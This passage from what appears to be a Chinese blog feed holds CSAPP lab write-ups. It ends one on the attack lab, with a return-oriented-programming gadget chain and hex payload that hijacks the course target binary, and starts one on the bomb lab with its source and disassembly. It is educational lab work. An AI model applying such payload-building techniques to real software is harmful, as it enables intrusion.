00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure><p>汇编代码:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span> %rsp, %rax</span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line"><span class="keyword">movq</span> %rax, %rdi</span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line">popq %rax</span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line">movl %eax, %edx</span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line">movl %edx, %ecx</span><br><span class="line">cmpb %c9, %c9</span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> %ecx, %esi</span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line"><span class="keyword">lea</span> (%rdi, %rsi, <span class="number">1</span>), %rax</span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line"><span class="keyword">movq</span> %rax, %rdi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>获取栈指针，然后栈上存储偏移，加和得到实际字符串指针，然后跳转到 touch3</p><p>明白指令含义，还有 rsp 始终代表当前程序栈顶,就不困难</p><p>结果:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 git:(master) cat level5.txt | ./hex2raw | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>全文完</p><p>任何建议或者疑问你可以发我邮件: <a href="mailto:&#x61;&#114;&#x64;&#x78;&#x77;&#x65;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#x61;&#114;&#x64;&#x78;&#x77;&#x65;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;关于课程&quot;&gt;&lt;a href=&quot;#关于课程&quot; class=&quot;headerlink&quot; title=&quot;关于课程&quot;&gt;&lt;/a&gt;关于课程&lt;/h2&gt;&lt;p&gt;这门课程围绕 &lt;a href=&quot;https://book.douban.com/subject/26912767/&quot;&gt;CSA
      
    
    </summary>
    
    
    
      <category term="CSAPP" scheme="http://yoursite.com/tags/CSAPP/"/>
    
  </entry>
  
  <entry>
    <title>CS15-213labs:bomb lab</title>
    <link href="http://yoursite.com/2020/09/20/CS15-213labs-bomb-lab/"/>
    <id>http://yoursite.com/2020/09/20/CS15-213labs-bomb-lab/</id>
    <published>2020-09-20T03:21:22.000Z</published>
    <updated>2020-09-26T09:35:31.537Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于课程"><a href="#关于课程" class="headerlink" title="关于课程"></a>关于课程</h2><p>这门课程围绕 <a href="https://book.douban.com/subject/26912767/">CSAPP</a> 展开。</p><p>书本相关的所有信息，你可以在 <a href="http://csapp.cs.cmu.edu/">这里</a> 找到。</p><p>你可以在 <a href="https://www.bilibili.com/video/BV1iW411d7hd?p=1">Bilibili</a> 或者 <a href="https://www.youtube.com/watch?v=4CpHpFu_KYM&list=PLQ5cMeVTtiJkUilq92Cw9D6RhAJhPJ_JX">YouTube</a> 查看所有的课程视频，Bilibili附带中文字幕。 </p><p>建议看完相应的章节然后去做相应的实验。大名鼎鼎的 CSAPP 的作者即是这门课程的讲师。你可以在 <a href="http://csapp.cs.cmu.edu/3e/labs.html">这里</a> 找到实验相关的所有内容。</p><p>这门课程的实验代码可以在我的 <a href="https://github.com/ArdxWe/CS15-213labs">Github</a> 找到我的所有解答及相关资料。本次实验相关代码在 ./bomb 文件夹下。</p><h2 id="bomb-lab"><a href="#bomb-lab" class="headerlink" title="bomb lab"></a>bomb lab</h2><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p>点击 <a href="http://csapp.cs.cmu.edu/3e/labs.html">这里</a>， 然后点击标红处 <img src="/images/bomb-lab-1.png" alt="Self-Study Handout"> 即可下载此次实验对应的文档。</p><p>解压之后文件夹对应目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 tree bomb       </span><br><span class="line">bomb</span><br><span class="line">├── bomb</span><br><span class="line">├── bomb.c</span><br><span class="line">└── README</span><br><span class="line"></span><br><span class="line">0 directories, 3 files</span><br></pre></td></tr></table></figure><ul><li>bomb: 可执行文件</li><li>bomb.c: 对应的部分 C 代码</li><li>README: 本次实验的简单说明</li></ul><h3 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h3><p>bomb目标代码文件运行时提示用户输入6个不同字符串，其中任意一个不正确炸弹会爆炸，也就意味着实验的失败。我们需要通过逆向工程来拆除炸弹，需要使用 gdb 和 objdump 。</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>Linux, 请不要使用 Windows :)</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>执行 bomb 程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb          </span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一切正常。查看 bomb.c 程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***************************************************************************</span></span><br><span class="line"><span class="comment"> * Dr. Evil&#x27;s Insidious Bomb, Version 1.1</span></span><br><span class="line"><span class="comment"> * Copyright 2011, Dr. Evil Incorporated. All rights reserved.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * LICENSE:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Dr. Evil Incorporated (the PERPETRATOR) hereby grants you (the</span></span><br><span class="line"><span class="comment"> * VICTIM) explicit permission to use this bomb (the BOMB).  This is a</span></span><br><span class="line"><span class="comment"> * time limited license, which expires on the death of the VICTIM.</span></span><br><span class="line"><span class="comment"> * The PERPETRATOR takes no responsibility for damage, frustration,</span></span><br><span class="line"><span class="comment"> * insanity, bug-eyes, carpal-tunnel syndrome, loss of sleep, or other</span></span><br><span class="line"><span class="comment"> * harm to the VICTIM.  Unless the PERPETRATOR wants to take credit,</span></span><br><span class="line"><span class="comment"> * that is.  The VICTIM may not distribute this bomb source code to</span></span><br><span class="line"><span class="comment"> * any enemies of the PERPETRATOR.  No VICTIM may debug,</span></span><br><span class="line"><span class="comment"> * reverse-engineer, run &quot;strings&quot; on, decompile, decrypt, or use any</span></span><br><span class="line"><span class="comment"> * other technique to gain knowledge of and defuse the BOMB.  BOMB</span></span><br><span class="line"><span class="comment"> * proof clothing may not be worn when handling this program.  The</span></span><br><span class="line"><span class="comment"> * PERPETRATOR will not apologize for the PERPETRATOR&#x27;s poor sense of</span></span><br><span class="line"><span class="comment"> * humor.  This license is null and void where the BOMB is prohibited</span></span><br><span class="line"><span class="comment"> * by law.</span></span><br><span class="line"><span class="comment"> ***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;support.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;phases.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Note to self: Remember to erase this file so my victims will have no</span></span><br><span class="line"><span class="comment"> * idea what is going on, and so they will all blow up in a</span></span><br><span class="line"><span class="comment"> * spectaculary fiendish explosion. -- Dr. Evil </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">FILE *infile;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Note to self: remember to port this bomb to Windows and put a </span></span><br><span class="line"><span class="comment">     * fantastic GUI on it. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with no arguments, the bomb reads its input lines </span></span><br><span class="line"><span class="comment">     * from standard input. */</span></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">    infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with one argument &lt;file&gt;, the bomb reads from &lt;file&gt; </span></span><br><span class="line"><span class="comment">     * until EOF, and then switches to standard input. Thus, as you </span></span><br><span class="line"><span class="comment">     * defuse each phase, you can add its defusing string to &lt;file&gt; and</span></span><br><span class="line"><span class="comment">     * avoid having to retype it. */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: Error: Couldn&#x27;t open %s\n&quot;</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t call the bomb with more than 1 command line argument. */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [&lt;input_file&gt;]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span></span><br><span class="line">    initialize_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to my fiendish little bomb. You have 6 phases with\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which to blow yourself up. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hmm...  Six phases must be more secure than one phase! */</span></span><br><span class="line">    input = read_line();             <span class="comment">/* Get input                   */</span></span><br><span class="line">    phase_1(input);                  <span class="comment">/* Run the phase               */</span></span><br><span class="line">    phase_defused();                 <span class="comment">/* Drat!  They figured it out!</span></span><br><span class="line"><span class="comment">                      * Let me know how they did it. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Phase 1 defused. How about the next one?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The second phase is harder.  No one will ever figure out</span></span><br><span class="line"><span class="comment">     * how to defuse this... */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s number 2.  Keep going!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* I guess this is too easy so far.  Some more complex code will</span></span><br><span class="line"><span class="comment">     * confuse people. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Halfway there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So you got that one.  Try this one.\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Round and &#x27;round in memory we go, where we stop, the bomb blows! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good work!  On to the next...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This phase will never be used, since no one will get past the</span></span><br><span class="line"><span class="comment">     * earlier ones.  But just in case, make this one extra hard. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span></span><br><span class="line"><span class="comment">     * something they overlooked?  Mua ha ha ha ha! */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由 45-64行可知， bomb程序可以通过标准输入和文件执行， 指定相应的文件在第二个参数。使用我已经破解的结果文件运行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb ./result</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string">So you got that one.  Try this one.</span></span><br><span class="line"><span class="string">Good work!  On to the next...</span></span><br><span class="line"><span class="string">Congratulations! You&#x27;</span>ve defused the bomb!</span><br></pre></td></tr></table></figure><p>没有任何问题。毫无疑问，首先反汇编。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ✗ objdump -d bomb &gt; assemblycode</span><br></pre></td></tr></table></figure><p>查看 main 处代码段。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">0000000000400da0 &lt;main&gt;:</span><br><span class="line">  400da0:    <span class="number">53</span>                       <span class="keyword">push</span>   %rbx</span><br><span class="line">  400da1:    <span class="number">83</span> ff <span class="number">01</span>                 <span class="keyword">cmp</span>    <span class="number">$0</span>x1,%edi</span><br><span class="line">  400da4:    <span class="number">75</span> <span class="number">10</span>                    <span class="keyword">jne</span>    400db6 &lt;main+<span class="number">0x16</span>&gt;</span><br><span class="line">  400da6:    <span class="number">48</span> 8b <span class="number">05</span> 9b <span class="number">29</span> <span class="number">20</span> <span class="number">00</span>     <span class="keyword">mov</span>    <span class="number">0x20299b</span>(%rip),%rax        # <span class="number">603748</span> &lt;stdin@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>&gt;</span><br><span class="line">  400dad:    <span class="number">48</span> <span class="number">89</span> <span class="number">05</span> b4 <span class="number">29</span> <span class="number">20</span> <span class="number">00</span>     <span class="keyword">mov</span>    %rax,<span class="number">0x2029b4</span>(%rip)        # <span class="number">603768</span> &lt;infile&gt;</span><br><span class="line">  400db4:    eb <span class="number">63</span>                    <span class="keyword">jmp</span>    400e19 &lt;main+<span class="number">0x79</span>&gt;</span><br><span class="line">  400db6:    <span class="number">48</span> <span class="number">89</span> f3                 <span class="keyword">mov</span>    %rsi,%rbx</span><br><span class="line">  400db9:    <span class="number">83</span> ff <span class="number">02</span>                 <span class="keyword">cmp</span>    <span class="number">$0</span>x2,%edi</span><br><span class="line">  400dbc:    <span class="number">75</span> 3a                    <span class="keyword">jne</span>    400df8 &lt;main+<span class="number">0x58</span>&gt;</span><br><span class="line">  400dbe:    <span class="number">48</span> 8b 7e <span class="number">08</span>              <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsi),%rdi</span><br><span class="line">  400dc2:    be b4 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x4022b4,%esi</span><br><span class="line">  400dc7:    e8 <span class="number">44</span> fe ff ff           callq  400c10 &lt;fopen@plt&gt;</span><br><span class="line">  400dcc:    <span class="number">48</span> <span class="number">89</span> <span class="number">05</span> <span class="number">95</span> <span class="number">29</span> <span class="number">20</span> <span class="number">00</span>     <span class="keyword">mov</span>    %rax,<span class="number">0x202995</span>(%rip)        # <span class="number">603768</span> &lt;infile&gt;</span><br><span class="line">  400dd3:    <span class="number">48</span> <span class="number">85</span> c0                 <span class="keyword">test</span>   %rax,%rax</span><br><span class="line">  400dd6:    <span class="number">75</span> <span class="number">41</span>                    <span class="keyword">jne</span>    400e19 &lt;main+<span class="number">0x79</span>&gt;</span><br><span class="line">  400dd8:    <span class="number">48</span> 8b 4b <span class="number">08</span>              <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rcx</span><br><span class="line">  400ddc:    <span class="number">48</span> 8b <span class="number">13</span>                 <span class="keyword">mov</span>    (%rbx),%rdx</span><br><span class="line">  400ddf:    be b6 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x4022b6,%esi</span><br><span class="line">  400de4:    bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x1,%edi</span><br><span class="line">  400de9:    e8 <span class="number">12</span> fe ff ff           callq  400c00 &lt;__printf_chk@plt&gt;</span><br><span class="line">  400dee:    bf <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x8,%edi</span><br><span class="line">  400df3:    e8 <span class="number">28</span> fe ff ff           callq  400c20 &lt;exit@plt&gt;</span><br><span class="line">  400df8:    <span class="number">48</span> 8b <span class="number">16</span>                 <span class="keyword">mov</span>    (%rsi),%rdx</span><br><span class="line">  400dfb:    be d3 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x4022d3,%esi</span><br><span class="line">  400e00:    bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x1,%edi</span><br><span class="line">  400e05:    b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  400e0a:    e8 f1 fd ff ff           callq  400c00 &lt;__printf_chk@plt&gt;</span><br><span class="line">  400e0f:    bf <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x8,%edi</span><br><span class="line">  400e14:    e8 <span class="number">07</span> fe ff ff           callq  400c20 &lt;exit@plt&gt;</span><br><span class="line">  400e19:    e8 <span class="number">84</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>           callq  4013a2 &lt;initialize_bomb&gt;</span><br><span class="line">  400e1e:    bf <span class="number">38</span> <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x402338,%edi</span><br><span class="line">  400e23:    e8 e8 fc ff ff           callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e28:    bf <span class="number">78</span> <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x402378,%edi</span><br><span class="line">  400e2d:    e8 de fc ff ff           callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e32:    e8 <span class="number">67</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>           callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e37:    <span class="number">48</span> <span class="number">89</span> c7                 <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400e3a:    e8 a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">  400e3f:    e8 <span class="number">80</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>           callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e44:    bf a8 <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x4023a8,%edi</span><br><span class="line">  400e49:    e8 c2 fc ff ff           callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e4e:    e8 4b <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>           callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e53:    <span class="number">48</span> <span class="number">89</span> c7                 <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400e56:    e8 a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           callq  400efc &lt;phase_2&gt;</span><br><span class="line">  400e5b:    e8 <span class="number">64</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>           callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e60:    bf ed <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x4022ed,%edi</span><br><span class="line">  400e65:    e8 a6 fc ff ff           callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e6a:    e8 2f <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>           callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e6f:    <span class="number">48</span> <span class="number">89</span> c7                 <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400e72:    e8 cc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           callq  400f43 &lt;phase_3&gt;</span><br><span class="line">  400e77:    e8 <span class="number">48</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>           callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e7c:    bf <span class="number">0b</span> <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x40230b,%edi</span><br><span class="line">  400e81:    e8 8a fc ff ff           callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e86:    e8 <span class="number">13</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>           callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e8b:    <span class="number">48</span> <span class="number">89</span> c7                 <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400e8e:    e8 <span class="number">79</span> <span 